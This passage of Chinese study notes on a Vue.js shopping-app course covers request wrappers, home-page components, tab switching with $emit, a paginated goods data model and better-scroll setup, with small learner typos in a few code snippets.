 -->

- 2. 创建 组件.js 文件 将组件中关于网络请求的事情 都在这个js文件操作
<!-- 
  上面封装好了 网络请求后 我们要开发发送网络请求了, 接下来我们home页要发送请求

  request.js文件是我们自己封装的, 我们所有的组件都是面向request.js发送请求, 这样不用担心换框架的问题

  但是 实际开发中 不会在 home.vue 文件中 调用request() 发送请求 而是在network文件夹中 创建 home.js 文件
 -->

- network 文件夹中 文件的结构
<!-- 
  这样关于home页的请求 都在home.js文件中

  | - network
    - request.js
    - home.js     跟首页相关的网络请求
 -->

- home.js 文件
- 这样封装的优点, 因为首页不仅仅是一个请求可能有多个请求 如果在home.vue文件中使用request.js是请求数据
- 当请求的地方很多的话, 请求的代码就会和组件内部的逻辑代码混合在一起 不方便管理 我们可以将所有关于首页的请求, 都封装在这个js文件中 做一个统一的管理 比如以后我要改哪个请求的url 直接在这个文件里修改就可以了

<!-- 
  import {request} from './request'

  // 获取首页的多个数据
  export function getHomeMultidata() {

    // 将请求的数据直接return出去
    return request({
      url:'/home/multidata'
    })
  }
 -->

- home.vue 文件
- 我们要在首页中发送网络请求, 那什么时候发送网络请求呢? 
<!-- 
  组件一旦创建好的时候发送网络请求 请求数据用于展示
  所以我们要使用生命周期函数

  created() {

    在这里使用我们封装的home.js文件中额方法 发送请求

  }
 -->

<!-- 
  created() {

    // 这个函数内部返回的是 promise 所以我们可以通过then()方法 获取响应回来的数据
    getHomeMultidata().then(res => {

      res 就是我们请求回来的数据

    })
  }
 -->

> 要点:
1. 因为函数的关系(函数调用完毕后内部的变量就会被销毁), 我们要将获取到的数据保存在组件的data中
<!-- 
  data() {
    result: null
  },

  created() {
    getHomeMultidata().then(res => {
      this.result = res
    })
  }

  原因:
  函数调用完毕后内部的变量就会被销毁 res = { } 
  res是函数中的变量, 当函数调用完毕后 变量 res 就会被销毁 那就说明没有指针指向{}, 那么{}因为没有指针指向它最终会被垃圾回收掉

  this.result = res 引用类型的赋值 给result的是地址值, 说明即使res在函数调用后会被销毁但是{}还有result指向 所以{}不会被垃圾回收
 -->

- 2. 获取能直接使用的数据
<!-- 
  上面的 then(res => { }) res是整体的数据, 里面包含了很多部分的数据
  为了方便使用 我们要将res中的数据 分别提取出来, 方便使用

   this.banners = res.data.banner.list
   this.recommends = res.data.recommend.list
 -->

- 3. 注意异步同步的问题
<!-- 
  created() {
    getHomeMultidata().then(res => {
      this.result = res

      在这里验证result可能获取不到 因为这个console是同步, 整个获取数据的过程是异步 所以console会在获取数据之前被打印
      console.log(result)
    })
  }
 -->


> 完整代码
<!-- 
  data() {
    return {
      banners: [],
      recommends:[]
    }
  },
  created() {
      this.banners = res.data.banner.list
      this.recommends = res.data.recommend.list
    })
  }
 -->

--------------------------

### 首页开发 - 轮播图的展示
- 上面的章节 我们已经从服务器上获取到了数据 接下来我们要将数据展示到页面上
- 我们需要封装一个组件, 然后进行展示
<!-- 
  轮播图老师没有做而是将他自己做好的组件 复制到了我们的项目
  老师创建了两个组件 将两个组件放在了一个index.js文件导出 方便统一导出了统一引入

  import Swiper from './Swiper'
  import SwiperItem from './SwiperItem'

  export {
    Swiper, SwiperItem
  }

  这样写的好处是 正常我们要是在组件中使用这个轮播图 我们需要引入两个组件
  import Swiper from ''
  import SwiperItem from ''

  但是如果是通过整合到一起的 index.js 的话 写一次就好了
  import { Swiper, SwiperItem } from ''
 -->

- 上面那节 我们将从服务器请求过来的数据 存到了data中的变量里
<!-- 
  banner:[{}, {}, {}, {}]

  每一个{}都是关于图片的信息, 每一个对象中有
  image: '图片地址'
  link: '点击图片跳转到哪里的地址'
  title: '这张图片的title'
 -->

> 老师封装的轮播图的组件的使用
<!-- 
  没事可以自己看看老师是怎么写的
 -->

- 将组件在 home.vue 文件中调用
<!-- 
  <swiper>
    <swiper-item v-for='(item,index) of banners' :key='index'>
      <a :href="item.link">
        <img :src="item.image">
      </a>
    </swiper-item>
  </swiper>
 -->

- 要点:
- 1. 我们从服务器请求过来的数据, 要根据请求回来的数据, 动态生成结构, 所以我们使用 v-for(哪个结构要重复就在哪个结构上使用v-for)

- 2. v-for 要加上 :key='item or index'
<!-- 
  老师推荐使用 item 但是 item 报错 index 没报错 为啥呢?
  因为item是一个大的数据 里面包含里很多(image link title等等属性) 比如我们可以使用item.id 等等 
-->

- 3. 给属性动态的绑定值的时候 我们使用 v-bind 只要是组件data里面的属性都能获取到


> swiper部分的抽取
- 每一个页面的组件 主要负责将所有的组件 集成在一起, 不然所有的内容都在home.vue中 这个页面的代码量会越来越多不方便管理
- 所以我们将swiper的部分也拿出来, 我们在每一个页面的文件夹内 再创建一个子组件文件夹
<!-- 
  | - views
    | - home
      | - childComps  home大页面中的子组件都放在这里

  这样 Home.vue 文件里的结构会非常的清晰

  // Home.vue
  <template>
    <div id='home'>

      // 下面的tabbar的结构
      <nav-bar class='home-nav'>
        <template #center>
          <span>购物车</span>
        </template>
      </nav-bar>

      // swiper的结构 这样home.vue不用管swiper内部是怎么实现的 只需要给这些小组件整合到一起就好
      <home-swiper :banners='banners'></home-swiper>
    </div>
  </template>
 -->  

> 流程
- 1. 我们在home文件夹下创建了一个childComps文件夹 用于放跟home相关的子组件
  - 在这里我们创建了 HomeSwiper.vue组件

- 2. 在 HomeSwiper.vue 组件中引入两个轮播的组件, 并注册
<!-- 
  import {Swiper, SwiperItem} from 'components/common/swiper/index'
  export default {
    name: "HomeSwiper",
    components: {
      Swiper,
      SwiperItem
    }
  }
 -->

- 3. 因为数据在home.vue里面 所以要使用props去接收数据
- 要点:
- 我们可以banners定义默认值的时候 因为type是对象 或者 数组的时候 我们要使用default函数的形式
<!-- 
  props: {
    banners: {
      type: Array,
      default() {
        return []
      }
    }
  }
 -->

- 4. 在home.vue组件中 要使用v-bind绑定父组件的变量
<!-- 
  让假糖 变成 真糖
  <home-swiper :banners='banners'></home-swiper>
 -->

--------------------------

### 首页开发 - 推荐信息的展示
- 上面轮播图的部分已经完成, 下面就是 推荐部分 
- 老师说 每一个部分其实都是一个组件 我们也在home的childComps中创建 推荐的组件(recommendView.vue)

- 我们定义了一个组件 准备展示在home.vue文件上, 但是数据在home上 所以recommendView.vue还是需要用props用来接收父组件中的数据
<!-- 
  我发现老师的步骤是 先在子组件中使用props
  然后马上去home.vue文件中 使用v-bind来获取数据
  最后再回到这个子组件中使用数据 调试 也很好哈~

  <template>
    <div class='recommend'>
      <div v-for='(item, index) of recommends' :key='index' class="recommend-item">
        <a :href="item.link">
          <img :src="item.image">
          <div>{{item.title}}</div>
        </a>
      </div>
    </div>
  </template>


  export default {
    name: 'RecommendView',
    props: {
      recommends: {
        type: Array,
        default() {
          return []
        }
      }
    }
  }
 -->

--------------------------

### 首页开发 - featrueView的封装
- 这个部分整体就是一张图片, 但仅是一张图片也不推荐直接在home.vue中直接<img>插入 我们还是通过组件的形式, 即使再简单我们也要给这个部分封装成一个组件 再在home.vue中引入

- 独立的组件一般都会有一个根
<!-- 
  <template>
    <div>

    </div>
  </template>
 -->

- 1. 在home文件夹的childComps文件夹里面创建 FeatureView.vue
<!-- 
  <template>
    <div class='feature'>
      <a href="https://act.mogujie.com/zzlx67">
        <img src="~assets/img/home/recommend_bg.jpg" alt="">
      </a>
    </div>
  </template>
 -->

- 2. 在home.vue文件中引入注册组件
- 这个部分没有太难的东西, 所以什么有什么好记录的
<!-- 
  关于css的部分可以记录下
  1. nav-bar的位置因为定位了 所以宽度丢失 这里有两种方案解决
  position:fixed
  top:0
  left:0
  right:0

  这样宽度就被撑起来了 或者 不加left和right 加width100%

  另外就把这个组件当做一个html文档来写就可以 组件没什么特别的当做网页来操作就可
 -->

--------------------------

### 首页开发 - TabControl的封装
- 这个部分就是一个 选项卡(tabcontrol)似的东西 因为多个页面也能用的到 所以我们可以给它在公共组件(components - content)里进行封装
<!-- 
      +------------------+
       最新   流行   新品
      +------------------+
 -->

> 只是文字不一样的时候就没必要搞插槽了
- 我们发现类似上面的结构在多页面中都需要使用, 之前我们想到可以定义插槽, 但是如果只是文字不一样的话就没必要定义插槽了(定义插槽后重复的代码量多增多)


> 不搞插槽怎么做?
- 我们使用props 调用的时候只需要告诉我文字是什么 有几组文字 我来决定选项卡页面中有几个选项卡
<!-- 
  选项卡组件 创建 props 用来接收 父组件(home)中的变量
  选项卡组件 根据 父组件中的变量 遍历 选项卡的数量

  那么只需要 父组件定义变量即可 就是说不用插槽 而是使用 父传子
 -->

> 阶段1
- 完成根据父组件的变量 展示选项卡
<!-- 
  因为只有文字不一样 我们使用的是 props 父传子
 -->
<!-- 
  props: {
    titles: {

      // 定义了类型 我们要求父组件中需要传递数组
      type: Array,
      default() {
        return []
      }
    }
  }

  // 根据父组件中的数据 来进行v-for展示 结果放在了span里面
  <div v-for='(item, index) of titles' :key='item'  class='tab-control-item' >
    <span>{{item}}</span>
  </div>


  // 父组件
  <tab-control :titles="['流行', '新款', '精选']"></tab-control>
 -->


> 阶段2
- 上面做完了后并没有样式, 这个阶段我们处理一下 选项卡的样式 我们在 TabControl.vue文件中处理
<!-- 
  .tab-control {
    display : flex;
    text-align: center;
    font-size:15px;
    height:40px;
    line-height: 40px;
  }

  .tab-control-item {
    flex:1;
  }
  
  .tab-control-item span {
    padding:5px;
  }
 -->


> 阶段3
- 样式处理好后, 我们处理点击效果, 当点击文字后 文字会变色 同时下方会出现横线
<!-- 
  先准备好样式
  .active {
    color:var(--color-high-text);
  }

  点击文字后 span出现下线 所以要这么写选择器
  .active span {
    border-bottom: 2px solid var(--color-tint);
  }
 -->

- 使用v-bind绑定class 在组件中创建 currentIndex 变量, 点击的文字的时候将index 传递给 currentIndex 
<!-- 
  标签中可以这样, 样式最终会合并到一起
  <div class='test' :class="{active: currentIndex === index}">
 -->


> 阶段4
- TabControl 吸顶效果
- 思路:
- 监听滚动, 一旦到了某个位置后 将我们的选项卡 改为 position:fixed, 监听向下滚动 到某个位置后 将我们的选项卡的 fixed 属性删除

- 但是我们不使用上面的方法
- 我们再home.vue文件中处理, 因为假如我们在TabControl.vue文件中处理 那么就意味着只要调用我们组件的地方 都会有这个效果

- 目前这个效果只有home.vue文件中需要, 所以我们在home.vue文件中使用

<!-- 
  .tab-control {
    position:sticky;

    // 必须写这个 还挺好用
    top:44px;
  }

  原理:
  当这个元素没有到某个位置之前 这个元素的position是static
  当这个元素达到了某个位置之后 这个元素的position被浏览器改为sticky
 -->

--------------------------

### 首页开发 - 保存商品的数据结构设计
- 接下来我们开始开发商品列表了 首先我们需要把数据请求回来
- 另外 在我们点击最新, 流行, 新品 按钮的时候 下面的列表中的图片没有换
<!-- 
      +------------------+
       流行   新款   精选
      +------------------+

      因为Vue会对内部的组件进行复用 比如我点击最新上面有很多的图片, 当我点击流行的时候 vue会将最新上的图片(组件)进行复用 这样就会出现一个问题

      原来组件中展示的图片, 当想展示新的图片的时候 图片就不会展示出来

      解决方案就是加一个 :key
 -->

- 上面bug的原因知道了 我们自己做的时候就可以避免了 接下来我们就需要展示自己的商品列表

<!-- 
  我们请求的数据会有些复杂, 因为我们既要展示流行的数据 也要展示新款的数据, 还要展示精选的数据 也就是说我的首页里面有所有的数据, 要根据不同的点击展示不同的数据

  也就是说我们要定义一个变量 来保存所有的数据

  goods: /流行/新款/精选

  当用户点击 流行 的时候 我们从goods中取出流行的数据展示在页面上, 以此类推
  那就是说在变量中应该存放着所有的数据, 不能点击的时候再发送对应的请求那么给用户的延迟就会比较长

  我们看看 保存数据的变量的模型


  goods: {
    'pop': {page:1, list: []},
    'news': {page:1, list: []},
    'sell': {page:1, list: []}
  }

  page 记录数据当前加载的时候加载到第几页的
  list 流行对应的所有数据都是保存在list中

  比如流行加载到第 5 页了 list里面保存着150条数据
  'pop': {page:5, list: [150]},
  'news': {page:2, list: [60]},


  goods中保存着3类数据, 我们这么设计 goods 本身是一个对象, 里面有3个对象分别对应着流行 新款 精选

  当用户点击 流行 按钮的时候 我们就把 pop 数据想办法取出来 然后展示list中的150条数据

  当用户点击 新款 的时候, 我们就在页面上加载60条数据, 如果用户在新款中做了 上拉加载更多 的操作 我们发现用户做了这样的操作后 又加载了30条数据 就需要把
  'news': {page:2, list: [60]},

  list中的60条数据 改成90条了 同时还要把page2 改成 page3
  所以page 和 list一个是用来记录当前数据加载到第几页的 和 当前已加载的数据的
 -->

- 因为我们请求的数据都在home页 所以我们将 goods 变量定义在home.vue中的data中
<!-- 
  goods: {
    'pop': {
      page: 0,
      list:[]
    },
    'news': {
      page: 0,
      list:[]
    },
    'sell': {
      page: 0,
      list:[]
    }
  }

  结构设计好后 我们就将请求回来的数据 塞到list中同时更改page
 -->

--------------------------

### 首页开发 - 首页数据的请求和保存
- 最新接口
- http://152.136.185.210:7878/api/m5
- 上面我们设计了一个模型用来保存数据, 接下来我们就要看怎么将数据请求下来
<!-- 
  goods: {
    'pop': { page: 0, list:[] },
    'news': { page: 0, list:[] },
    'sell': { page: 0, list:[] }
  }

  我们当前模型中是没有任何数据的, 我们先把每一个分类的第一页的数据默认请求下来
  方便用户切换按钮的时候数据能够正常的展示, 第2 3页只有当用户在分类内选择上拉加载更多的时候再请求更多的数据
 -->

- 既然是请求数据 跟请求数据相关的操作我们都做了一层封装 都放在了 network -- home.js 文件里了
<!-- 
  这个函数也需要传递过来一些参数 因为我们要针对不同的情况请求不同的数据
  123.207.32.32:8000/home/data?type=sell&page=1

  type是类型 我们请求哪一个分类 一个有3个 pop new sell
  还有页码只有告诉页码 才能请求对应的数据

  export function getHomeGoods(type, page) {
    return request({
      url:'/home/data',
      params: {
        type,
        page
      }
    })
  }
 -->

- 上面我们定义好了请求数据的函数, 接下来我们在哪个组件? 什么时候发送请求呢?
- 因为是home.vue的数据, 所以也在这个组件中 来获取数据, 同样也是在组件一创建的时候获取各个分类(pop new sell)第一页的数据 便于展示

- 但是我们思考一个问题, 假如我们获取数据, 保存数据的操作都在created函数中进行, 那么当以后需要获取数据的地方越来越多 created函数中的代码量和逻辑就会越来越多不方便管理

- created是一个比较特殊的函数 一旦组件创建后vue就会执行这个函数, 所以这个函数内部需要放主要的逻辑, 而类似这种重复性的处理函数内部数据的功能 我们在methods属性中定义

<!-- 
  我们只在created函数中 放主要的逻辑 至于具体的操作我们放在methods中进行
  
  created() {
    // 请求数据(轮播图和下面的模块)
    this.getHomeMultidata()

    // 请求商品列表的数据 默认请求第一页 30条
    this.getHomeGoods('pop');
    this.getHomeGoods('new');
    this.getHomeGoods('sell');
  }

  这样 created 中的逻辑就会很清晰 上面都要使用this 因为调用的是methods中的方法, 使用this才是在使用组件内部的方法, 不使用this就会去全局中找这个方法
 -->


- 在methods中 我们再对请求数据的函数进行一层封装, 函数名定义成跟请求数据的函数名一样

- 这样的话 我相当于对请求数据的函数又包装了一层 包装在了methods里面 在methods里面进行一些具体的相关请求 然后在created中调用函数 这样created中的逻辑就会很清晰

<!-- 
  methods: {

    // 请求轮播图数据的函数
    getHomeMultidata() {
      getHomeMultidata().then(res => {
          this.banners = res.data.banner.list
          this.recommends = res.data.recommend.list
        })
      },
    }


    - 形参type:
      这里对商品列表的请求数据的函数再做一层封装, 定义个形参type, 这样一个方法可以通过传参请求不同的数据
    - 
    getHomeGoods(type) {

      // 里面请求数据的函数的形参 我们添加了 page 并没有写死

      page写死也不好, 因为当用户进行上拉加载更多的时候 这个方法会复用 写死了怎么复用

      应该是 goods:{ 'pop': { page : 0 }}
      原来的页码+1

      比如第一次请求数据(pop分类)的时候 我们在url的后面传递的是page=1
      如果上拉加载更多的时候 page 应该 +1

      let page = this.goods[type].page + 1

      当第一页请求完毕后 我们要把goods中的对应对象的page改为 新的page


      // 上拉加载更多 page+1 的逻辑, 根据type取到指定对象(pop new sell)的page
      let page = this.goods[type].page + 1

        getHomeGoods(type, page).then(res => {

          // 将res中的数据保存在 goods 中 对应的分类的list数组里 res.data.list是一个数组, 我们要将这个数组中的元素 放入 goods中的list数组里
          this.goods[type].list.push(...res.data.list);
          
          // 修改goods中的page
          this.goods[type].page += 1;
        })
      }
    }
 -->

--------------------------

### 首页开发 - 首页商品数据的展示
- 前面已经把商品列表的部分的数据请求下来了保存在了home.vue中, 接下来就是开始封装组件展示在home页中
- 思路
<!-- 
    +------------+
    +   +----+   +
    +   +    +   +
    +   +----+   +
    +            +
    +------------+

    整个商品列表的部分是一个大组件, 里面是每一个小结构就是一个小组件 之后通过遍历的方式往大组件里面去塞小组件
    这个组件是会被复用的, 所以我们在components中的content里面创建
 -->
- 这里再说下组件化开发 我们把网页中的每一个部分当做一个组件, 将这个部分封装成一个个的组件再展示在页面中

> 具体步骤
- 1. 我们在 components - content - goods - GoodsList / GoodsListItem 创建了两个组件
- 分别是 整体的大组件(GoodsList) 和 每一个商品的小组件(GoodsListItem)

- 我们将GoodsList在home.vue中导入 注册 并 使用 为了将大组件展示在home.vue中
<!-- 
  // 我们在home.vue中使用了 goods-list组件
  <goods-list><goods-list>

  import GoodsList from 'components/content/goods/GoodsList'
 -->


- 2. 数据在组件中的传递 home.vue -- > GoodsList.vue
- 数据都是在home.vue中发送请求, 获取数据 保存数据, 那么我们 GoodsList.vue 组件中要展示商品列表肯定也要使用到 数据
- 所以我们要拿到home.vue中的数据 便于展示
<!-- 
  我们要在这一个大组件里根据按钮的点击展示对应的数据, 下面我们先拿展示 流行模块第一页数据为例
  之后我们再添加点击按钮展示对应模块的数据的功能
 -->

- 因为只是数据不一样 我们还是通过props来进行操作
<!-- 
  // GoodsList.vue 子组件
  <div class="goods">
    // 我们根据这个数据决定遍历多少个小的item 放到这里面就可以了
    // 这里 goods 是一个数组, item是数组中的每一个对象
    <goods-list-item v-for='(item, index) of goods' :key='index'></goods-list-item>
  </div>

  // 我们在子组件中定义props 来接收 父组件中的数据
  props: {
    goods: {
      type: Array,
      default() {
        return []
      }
    }
  }

  // home.vue 父组件
  我们在父组件中使用 子组件的变量goods来接收 goods - pop - list中的数据
  <goods-list :goods=goods['pop'].list><goods-list>
    - 我们将goods中的pop的list中的数据拿出来 给子组件GoodsList使用
 -->


- 3. 数据在组件中的传递 GoodsList.vue  -- > GoodsListItem.vue
- 大组件中是每一个小组件, 每一个小组件中的内容对应着父组件goods数组中的每一个对象
- 也就是我们的每一个GoodsListItem应该对应着父组件goods数组中的一个对象 所以 GoodsListItem.vue 中也要使用props获取GoodsList中传递的数组中的对象
<!-- 
  // GoodsListItem.vue中

  <template>
    <div class="goods-item">
      <img :src="goodsItem.show.img" alt="">
      <div class="goods-info">
        <p>{{goodsItem.title}}</p>
        <span class="price">{{goodsItem.price}}</span>
        <span class="collect">{{goodsItem.cfav}}</span>
      </div>
    </div>
  </template>


  // 我们定义一个变量 goodsItem 用来接收 父组件中的每一个对象数据
  props: {
   goodsItem: {
     type: Object,
     deault() {
       return {}
     }
   }
 }

  goodsItem 是我们定义的变量 我们在模板中使用的时候要使用 goods-item 这种写法 驼峰的形式在模板中解析不了

 // 父组件 GoodsListItem
 <goods-list-item v-for='(item, index) of goods' :key='index' :goods-item='item'></goods-list-item>
    - 我们使用 v-bind 绑定 goods-item='item' 这里的 item 是我们遍历goods得到的每一个对象

  这样每一个 goodsItem 变量就是 goods数组中的每一个对象

  比如我们在模板中使用 goodsItem 中的图片 可以这样
  <img :src="goodsItem.show.img" alt="">
 -->


- 4. 上面数据都已经互相的传递完毕 那我们接下来就可以通过css样式来调整每个组件的展示效果
- 一般这里还是采用了flex布局


--------------------------

### 首页开发 - 点击 TabControl 按钮切换商品
- 上面完整了展示商品列表的操作, 但是是写死的, 我们相当于直接手动取得了goods中的pop的数据
<!-- 
  <goods-list :goods=goods['pop'].list><goods-list>
 -->

- 这样我再点击 流行 新款 精选按钮后就没有对应的切换效果了 我们要通过点击谁动态选择要展示哪一类
- 思路:
- 我们要对 流行 新款 精选 按钮做一个点击事件的监听, 注意这个按钮的点击是在一个组件里面 我们要将这个组件内部的点击事件传递到外面(home组件里面)
- home组件里会根据你点击了谁 然后做切换数据的操作 所以我们要将组件内的点击事件传递到组件外部
- 使用 this.$emit()
<!-- 
  外部 向 内部 传递 使用 props
  内部 向 外部 传递 使用 $emit
 -->

> 1. 将子组件点击事件传递到外面 使用 $emit
<!-- 
  // TabControl组件

  // 我们要将下面的点击事件传递到组件外部
  methods: {
   itemClick(index) {
     this.currentIndex = index;

     // 1. 使用 this.$emit()  自定义事件名 相当于给子组件事件的名字起个别名吧, 也要传出去点了谁 所以把index传递出去
     this.$emit('tabClick', index)
   }
 }


  // home组件
  在模板的位置 使用v-on 绑定子组件发射出来的自定义事件
  <tab-control :titles="['流行', '新款', '精选']" class='tab-control' @tabClick='tabClick'></tab-control>

  定义一个
  tabClick 去本组件的methods定义对应的方法
 -->


> 2. 在父组件中使用 v-on绑定自定义事件
- 
<!-- 
  // 父组件
  <tab-control :titles="['流行', '新款', '精选']" class='tab-control' @tabClick='tabClick'></tab-control>


  // 定义 tabClick 的处理函数
  tabClick(index) {

    // 这里根据 index 来决定 到底是pop new 还是 sell
    // <goods-list :goods="goods['pop'].list"></goods-list>

    switch(index) {
      case 0:
        this.currentType = 'pop'
        break;
      case 1:
        this.currentType = 'new'
        break;
      case 2:
        this.currentType = 'sell'
        break;
    }
  
   这样根据index 我们知道了点击了谁, 根据点击了谁 去goods里面取对应的数据 然后将对应的数据传递到GoodsList组件里面
 -->


> 3. 模板中长的结构 要使用计算属性进行整理
<!-- 
  使用计算属性 整理
  <goods-list :goods="goods[currentType].list"></goods-list>
  整理成
  <goods-list :goods="showGoods"></goods-list>

  computed: {
    showGoods() {
      return this.goods[currentType].list
    }
  },
 -->

--------------------------

### Better-scroll 安装 和  使用
- 上面首页的效果大致上完成了 但是还有一个问题, 当我们把项目部署到服务器上
- 用手机去浏览页面的时候, 不会特别流程 会有卡顿等现象
<!-- 
  现在我们用的是浏览器自带的滚动效果 这种滚动在移动端会非常卡顿的
  为了解决移动端滚动时的卡顿问题, 在移动端滚动更加的顺滑 会使用 iscroll 框架

  但是 iscroll 已经不维护了 我们要改用 better-scroll
 -->

- 我们使用 better-scroll 对原生的滚动效果做一个重构
- 这里再重申下, 第三方的框架不要在组件中直接使用 我们都要对框架进行一层封装, 避免以后框架不维护了

> 1. 安装 better-scroll
- npm install better-scroll -S 
<!-- 
  # 安装带有所有插件的 BetterScroll     老师选择的是这个
  npm install better-scroll@1.13.2 --save 
 -->

- npm install @better-scroll/core
<!-- 
   # 核心滚动，大部分情况可能只需要一个简单的滚动
 -->


> 2. 在组件内引入 better-scroll
- import BScroll from 'better-scroll'


> 3. 在生命周期函数中 new BScroll('el', {配置参数})
- el通过document.querySelector 选择
- 或者直接写类名也可以
<!-- 
  // 不能在created中使用 better-scroll 因为template还未挂载到dom中 获取不到节点等
  created() {
    不能在这里使用better-scroll
  },


  // 在这个生命周期中使用
  mounted() {
    new BScroll(document.querySelector('.wrapper'))
  }
 -->

> 注意:
- better-scroll 要求 我们要在滚动内容的外层加一个wrapper并且指定固定高度
- 需要滚动的内容必须在一个标签里面
<!-- 
  <div class='wrapper'>     给这个wrapper设置固定高度
    <div class='content'>
      这里内容很多 需要滚动
    </div>
  </div>

  也就是说 wrapper 里面只能有一个标签
 -->

> 总结
- better-scroll的使用很简单
- 1. npm下载
- 2. 组件中引入 import
- 3. 在 mounted() {} 中使用new BScroll()创建
<!-- 
  参数1: 使用document.querySelector选择滚动内容外层的包裹
  参数2: 配置选项 是一个对象
 -->

- 要求:
- 1. 必须有包裹 包裹必须指定高度
- 2. 包裹内部是一个元素 这个元素内部可以有很多元素 但是对于包裹来说只有一个孩子
<!-- 
  <div class='wrapper'>
    <ul>
      很多内容
    </ul>
  </div>
 -->


> 扩展知识点
- 1. 
<!-- 
  bscroll.js
  bscroll.esm.js    模块化 require的时候引用的就是这个文件
 -->

- 2. 
- 因为 new BScroll(document.querySelector('.wrapper')) 是在声明周期函数内创建的 假如没有一个变量指向它 它可能会被回收掉 所以最好这样
<!-- 
  data() {
    return {
      scroll: null
    }
  },

  mounted() {
    this.scroll = new BScroll()
  }
 -->

--------------------------

### Better-scroll 的基本使用解析
> 使用 Better-scroll 监听用户滚动到哪个位置了
- 1. 创建 BScroll 实例
<!-- 
  let bscroll = new BScroll(document.querySelector('.content'));
 -->

> 使用on绑定 scroll事件
- 2. 给 bscroll 使用on绑定scroll事件, position参数就是实时滚动到哪里了
- 默认情况下bscroll是不可以实时监听滚动位置的 要是想要实时监听滚动的位置的话必须传递第二个配置参数


> 配置属性1 probeType
- probeType: 0, 1, 2
- 是否实时监测滚动位置
- 0 和 1 都是不实时侦测滚动位置
- 2 在手指滚动的过程中侦测, 手指离开后的惯性滚动过程中不侦测
- 3 只要是滚动都侦测, 惯性滚动过程中也侦测

<!-- 
  let bscroll = new BScroll(document.querySelector('.content'), { 配置参数 });

  let bscroll = new BScroll(document.querySelector('.content'), { 
    probeType:2
  });
 -->

<!-- 
  bscroll.on('scroll', function(position) {
    console.log(position)

    // 结果:
    {
      x:0, y:-1110
    }
  })
 -->


> 配置属性2 click
- 如果我么使用better-scroll来管理滚动元素的话, 如果滚动元素中存在着按钮, 默认是不能监听按钮的点击的
- click: true    (默认是false)

> 配置属性2 taps: true
> 配置属性2 keepAlive: true
- 用于在页面切换的时候保持原先的位置


> 配置属性3: pullUpLoad
- 比如我们滚动到底部的时候出现上拉加载更多, 如果想做上拉加载更多的话, 一旦滚动到最底部的 给我们回调一个事件, 现在我们只是展示了第一页的数据 然后再次上拉请求第二页数据, 再次追加到数组里面, 然后一起展示数组中的所有数据

- pullUpLoad: boolean
- 这个配置用于做上拉加载功能, 默认为false, 当设置true或者一个object的时候, 可以开启上拉加载

- 版本2.x之后 这个功能需要再次安装插件
- npm i @better-scroll/pull-up --save
<!-- 
  pullUpLoad: true

  pullUpLoad: {
    threshold: 50
  }
  可以配置threshold来决定开始加载的时机, 当上拉加载数据加载完毕后, 需要执行
  bscroll.finishPullUp()
 -->


> 使用on给实例绑定 pullingUp 事件
- 触发时机: 在一次上拉加载的动作后, 这个时机一般用来去后端请求数据
- 一旦滚动到最底部 就会触发回调
<!-- 
  bscroll.on('pullingUp', function() {
    绑定pulllingUp事件, 当一次上拉加载的时候 执行回调中的代码

  })
 -->

- 注意, 上拉加载更多 回调只会触发一次, 为了防止多次请求, 所以在触发了一次上拉加载的回调后 内部必须调用 bscroll.finishPullUp() 方法 告诉它 一次加载已经完成
<!-- 
  bscroll.on('pullingUp', function() {
    绑定pullingUp事件, 当一次上拉加载的时候 执行回调中的代码
    console.log('上拉加载更多');

    // 发送网络请求, 请求更多页的数据

    // 等数据请求完成, 并且将新的数据展示出来后 执行
    bscroll.finishPullUp()
    bscroll.refresh()
  })
 -->
 
> 配置属性4 observeImage
- 弹幕上还说 当因图片的问题 没办法判断到没到底部的时候我们可以加上这个属性
<!-- 
  observeImage: true
 -->


> 常用方法
- refresh()：
- 重新计算BetterScroll，当DOM解构发生变化时，确保滚动效果正常；
- bscroll.refresh()
<!-- 
  // 每次dom结构更新之后调用这个方法
  updated() {
    // 在home.vue组件中 通过获取this.$refs.scroll Scroll.vue组件对象 使用scroll实例的方法
    this.$refs.scroll.scroll.refresh()
  }
 -->

- scrollTo(x, y, time(毫秒), easing, extraTransform): 
- 滚动到指定位置，time指定动画时间；
<!-- 
  上面我们创建了 scroll实例对象, 这是实例对象的方法
  也就是想回到 滚动区域的顶部 需要通过 scroll实例对象调用scrollTo(x,y)方法

  this.scroll.scrollTo(0, 0)
  this.$refs.scroll.scroll.scrollTo(0, 0, 500)
 -->


> 常用事件
- refresh：
    - 重新计算BetterScroll，当DOM解构发生变化时，确保滚动效果正常；
    <!-- 
      bs.on('refresh', () => { ... })
     -->

- 下面的事件必须注册相应插件才能使用：
- pullingDown(pull-down)下拉刷新：
<!-- 
  import BScroll from '@better-scroll/core'
  import Pulldown from '@better-scroll/pull-down'
  //注册插件
  BScroll.use(Pulldown)
  export default {
    name: 'App',
    mounted() {
      this.$nextTick(() => {
        let bs = new BScroll(this.$refs.wrapper, {
          pullDownRefresh: true
      })
      bs.on('pullingDown', (position) => {
        await fetchData()
        console.log('ddd');
        bs.finishPullDown()
      })
      })
    }
  }
 -->

- pullingUp(pull-up)上拉刷新:
<!--  
  import BScroll from '@better-scroll/core'
  import Pullup from '@better-scroll/pull-up'

  BScroll.use(Pullup)
  export default {
    name: 'App',
    mounted() {
      this.$nextTick(() => {
        let bs = new BScroll(this.$refs.wrapper, {
          pullUpLoad: true
      })
      bs.on('pullingUp', (position) => {
        // await fetchData()异步请求数据
        console.log('ddd');
        bs.finishPullUp()
      })
      })
    }
  }
 -->


> 完整代码
<!-- 
  const bscroll = new BScroll(document.querySelector('.content'), {
    probeType:3,      // 开始侦测实时滚动位置
    click: true       // 在滚动区域内可以监听点击事件
    pullUpLoad:true   // 开启上拉加载的功能
  })

  // 给实例绑定 scroll 事件 监听滚动位置
  bscroll.on('scroll', function(position) {
    console.log(position)     // {x:0 y:100}
  })

  // 给实例绑定 pulllingUp 事件 监听一次上拉加载之后 执行回调
  bscroll.on('pulllingUp', function() {
    
    // 防止多次请求 2秒内 因为只要没调用 bscroll.finishPullUp() 就不能再次上拉
    setTimeout(() => {
      bscroll.finishPullUp()
    }, 2000)
  })
 -->

- 我们开看下Vue中代码部分
<!-- 
  <script>
  import BScroll from 'better-scroll'

  export default {
    name: 'Category',
    data() {
      return {
        scroll:null
      }
    },

    // 我们在mounted函数中创建better-scroll实例 created里面取不到dom节点
    // 为什么要创建变量接收实例 因为垃圾回收的机制
    mounted() {
      this.scroll = new BScroll(document.querySelector('.wrapper'), {
        probeType: 2,
        pullUpLoad:true
      }),

      this.scroll.on('scroll', (position) => {
        // console.log(position)
      }),

      this.scroll.on('pullingUp', () => {
        console.log('上拉加载更多');

        // 这里保存下this 因为settimeout中的this指向window
        let that = this;
